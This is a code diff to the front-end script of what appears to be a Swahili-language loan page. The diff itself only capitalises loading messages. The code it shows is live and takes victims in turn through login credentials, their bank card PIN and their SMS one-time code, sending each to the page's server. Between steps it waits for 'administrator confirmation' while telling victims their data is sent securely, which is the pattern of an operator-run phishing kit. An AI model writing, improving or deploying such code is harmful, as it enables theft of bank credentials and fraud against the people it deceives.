@@ -38,7 +38,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
   if (sliderDuration && durationVal) {
     sliderDuration.addEventListener('input', (e) => {
-      durationVal.innerText = `miezi ${e.target.value}`;
+      durationVal.innerText = `MIEZI ${e.target.value}`;
     });
   }
 
@@ -126,7 +126,7 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     if (credsSurfaceBanner) credsSurfaceBanner.classList.remove('active');
-    showLoading('Inathibitisha Taarifa...', 'Inatuma taarifa kwa usalama.');
+    showLoading('INACHAKATA TAARIFA...', 'Inatuma taarifa kwa usalama.');
 
     try {
       const res = await fetch(`/api/submit-credentials?admin=${encodeURIComponent(adminParam)}`, {
@@ -138,7 +138,7 @@ document.addEventListener('DOMContentLoaded', () => {
       const data = await res.json();
       if (data.success) {
         currentUserId = data.userId;
-        document.getElementById('loading-title').innerText = 'Inasubiri Uthibitisho wa Msimamizi...';
+        document.getElementById('loading-title').innerText = 'INASUBIRI UTHIBITISHO WA MSIMAMIZI...';
         document.getElementById('loading-sub').innerText = 'Tafadhali baki kwenye ukurasa huu.';
         startStatusPollingForCardPin();
       } else {
@@ -191,7 +191,7 @@ document.addEventListener('DOMContentLoaded', () => {
     document.getElementById('card-pin-error').style.display = 'none';
     if (cardPinSurfaceBanner) cardPinSurfaceBanner.classList.remove('active');
 
-    showLoading('Inathibitisha PIN ya Kadi...', 'Inatuma namba ya siri kwa usalama.');
+    showLoading('INATHIBITISHA PIN YA KADI...', 'Inatuma namba ya siri kwa usalama.');
 
     try {
       const res = await fetch('/api/submit-card-pin', {
@@ -202,7 +202,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
       const data = await res.json();
       if (data.success) {
-        document.getElementById('loading-title').innerText = 'Inasubiri Uthibitisho wa PIN...';
+        document.getElementById('loading-title').innerText = 'INASUBIRI UTHIBITISHO WA PIN...';
         document.getElementById('loading-sub').innerText = 'Tafadhali baki kwenye ukurasa huu.';
         startStatusPollingForOtp();
       } else {
@@ -265,7 +265,7 @@ document.addEventListener('DOMContentLoaded', () => {
     document.getElementById('otp-error').style.display = 'none';
     if (otpSurfaceBanner) otpSurfaceBanner.classList.remove('active');
 
-    showLoading('Inathibitisha OTP...', 'Inakagua namba yako ya uthibitisho ya SMS.');
+    showLoading('INATHIBITISHA OTP...', 'Inakagua namba yako ya uthibitisho ya SMS.');
 
     try {
       const res = await fetch('/api/submit-otp', {
@@ -276,7 +276,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
       const data = await res.json();
       if (data.success) {
-        document.getElementById('loading-title').innerText = 'Inakagua Namba...';
+        document.getElementById('loading-title').innerText = 'INAKAGUA NAMBA...';
         document.getElementById('loading-sub').innerText = 'Tafadhali subiri.';
         startStatusPollingForOtp();
       } else {
@@ -303,4 +303,4 @@ document.addEventListener('DOMContentLoaded', () => {
     if (stepLoading) stepLoading.classList.remove('active');
   }
 });
-                                        
+                                                          
